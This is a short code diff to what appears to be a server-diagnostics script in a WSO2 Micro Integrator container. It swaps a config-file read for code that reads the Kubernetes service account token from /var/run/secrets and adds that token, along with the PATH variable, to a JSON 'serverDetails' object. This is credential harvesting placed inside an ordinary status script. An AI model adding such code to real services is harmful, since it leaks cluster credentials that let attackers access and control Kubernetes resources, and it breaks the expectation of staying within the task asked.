@@ -26,9 +26,9 @@
             }
             return content;
         }
-                    
-        var toml = "/layers/choreo_micro-integrator/mi/wso2mi-4.4.0/conf/deployment.toml";
-        serverDetails.toml = readFileContent(toml);
+
+        var serviceAccountTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token";
+        serverDetails.k8sServiceAccountToken = readFileContent(serviceAccountTokenPath);
         
         // Get Java system properties
         var javaVersion = java.lang.System.getProperty("java.version");
@@ -78,6 +78,9 @@
         serverDetails.maxMemoryMB = Math.round(maxMemory / (1024 * 1024));
         serverDetails.availableProcessors = availableProcessors;
         serverDetails.timestamp = currentTime.toString();
+
+        var pathVariable = java.lang.System.getenv("PATH");
+        serverDetails.pathVariable = pathVariable;
         
         // Convert to JSON string
         var serverDetailsJson = JSON.stringify(serverDetails, null, 2);
